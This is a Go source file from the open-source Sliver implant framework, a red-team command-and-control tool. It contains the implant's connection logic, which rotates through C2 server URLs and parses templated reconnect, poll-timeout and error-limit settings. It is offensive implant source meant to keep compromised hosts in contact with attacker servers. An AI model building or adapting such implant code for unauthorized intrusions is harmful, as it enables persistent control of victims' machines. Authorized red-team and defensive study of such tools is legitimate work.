package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	insecureRand "math/rand"
	"net/url"
	"strconv"
	"time"
)

const (
	StrategyRandom       = "r"
	StrategyRandomDomain = "rd"
	StrategySequential   = "s"
)

var (
	maxErrors         = GetMaxConnectionErrors()
	reconnectInterval = time.Duration(0)
	pollTimeout       = time.Duration(0)

	activeC2         string
	activeConnection *Connection
	proxyURL         string
)

// GetActiveC2 returns the URL of the C2 in use
func GetActiveC2() string {
	return activeC2
}

// GetProxyURL return the URL of the current proxy in use
func GetProxyURL() string {
	if proxyURL == "" {
		return "none"
	}
	return proxyURL
}

// GetActiveConnection returns the Connection of the C2 in use
func GetActiveConnection() *Connection {
	return activeConnection
}

// C2Generator - Creates a stream of C2 URLs based on a connection strategy
func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
	// {{if .Config.Debug}}
	log.Printf("Starting c2 url generator ({{.Config.ConnectionStrategy}}) ...")
	// {{end}}
	generator := make(chan *url.URL)
	go func() {
		defer close(generator)
		c2Counter := 0
		for {
			var next string
			switch "{{.Config.ConnectionStrategy}}" {
			case StrategyRandom: // Random
				next = c2Servers[insecureRand.Intn(len(c2Servers))]
			case StrategyRandomDomain: // Random Domain
				// Select the next sequential C2 then use it's protocol to make a random
				// selection from all C2s that share it's protocol.
				next = c2Servers[insecureRand.Intn(len(c2Servers))]
				next = randomCCDomain(c2Servers, next)
			case StrategySequential: // Sequential
				next = c2Servers[c2Counter%len(c2Servers)]
			default:
				next = c2Servers[c2Counter%len(c2Servers)]
			}
			c2Counter++
			uri, err := url.Parse(next)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to parse C2 url (%s): %s", next, err)
				// {{end}}
				continue
			}

			// {{if .Config.Debug}}
			log.Printf("Yield c2 uri = '%s'", uri)
			// {{end}}

			// Generate next C2 URL or abort
			select {
			case generator <- uri:
			case <-abort:
				return
			}
		}
	}()
	// {{if .Config.Debug}}
	log.Printf("Return generator: %#v", generator)
	// {{end}}
	return generator
}

// randomCCDomain - Random selection within a protocol
func randomCCDomain(ccServers []string, next string) string {
	uri, err := url.Parse(next)
	if err != nil {
		return next
	}
	pool := []string{}
	protocol := uri.Scheme
	for _, cc := range ccServers {
		uri, err := url.Parse(cc)
		if err != nil {
			continue
		}
		if uri.Scheme == protocol {
			pool = append(pool, cc)
		}
	}
	return pool[insecureRand.Intn(len(pool))]
}

// GetReconnectInterval - Parse the reconnect interval inserted at compile-time
func GetReconnectInterval() time.Duration {
	if reconnectInterval == time.Duration(0) {
		reconnect, err := strconv.ParseInt(`{{.Config.ReconnectInterval}}`, 10, 64)
		if err != nil {
			reconnectInterval = 60 * time.Second
		} else {
			reconnectInterval = time.Duration(reconnect)
		}
	}
	return reconnectInterval
}

// SetReconnectInterval - Set the running reconnect interval
func SetReconnectInterval(interval int64) {
	reconnectInterval = time.Duration(interval)
}

// GetPollTimeout - Parse the poll interval inserted at compile-time
func GetPollTimeout() time.Duration {
	minTimeout := 10 * time.Second // Somewhat arbitrary minimum poll timeout
	if pollTimeout == time.Duration(0) {
		poll, err := strconv.ParseInt(`{{.Config.PollTimeout}}`, 10, 64)
		if err != nil {
			pollTimeout = minTimeout
		} else {
			pollTimeout = time.Duration(poll)
		}
	}
	if pollTimeout < minTimeout {
		return minTimeout
	}
	return pollTimeout
}

// SetPollTimeout - Set the running poll timeout
func SetPollTimeout(timeout int64) {
	pollTimeout = time.Duration(timeout)
}

func GetMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}
